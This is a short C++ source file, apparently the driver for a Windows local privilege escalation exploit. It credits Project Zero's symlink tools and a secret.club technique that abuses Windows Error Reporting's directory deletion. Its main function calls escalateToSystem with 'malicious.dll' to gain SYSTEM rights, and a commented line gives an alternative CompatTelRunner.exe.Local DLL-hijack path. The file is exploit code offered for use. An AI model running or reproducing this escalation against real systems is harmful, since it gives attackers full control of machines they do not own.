// This code has been developed by @gweeperx (a.k.a Dimopoulos Elias). 
// This code is heavily based on symboliclink testing tools from google's project zero 
// https://github.com/googleprojectzero/symboliclink-testing-tools
// The technique which is implemented here, has been described by @jonasLyk in the following url:
// https://secret.club/2020/04/23/directory-deletion-shell.html

#include "stdafx.h"
#include "D_WER.h"

#include <FileSymlink.h>
#include <windows.h>
#include <iostream>
#include <string.h>
#include <sys/stat.h>
#include <Shlwapi.h>


int _tmain()
{
	D_WER* systemElevation;
	systemElevation = new D_WER();
	std::wcout << L"[+] Target Folder: " << systemElevation->get_target_folder() << "\n" << std::endl;
	
	/*Example: Just call the function with the dll you want to use. The function will try to detect the correct technique for your system*/
	systemElevation->escalateToSystem(L"malicious.dll");
	
	//Example: with the taskhostw.exe.Local technique, you can restart the system in order to see the result immediately. It work with Pro Edition.
	//systemElevation->escalateToSystem(L"malicious.dll", L"C:\\Windows\\System32\\CompatTelRunner.exe.Local\\");

	getchar();

	return 0;
	
}
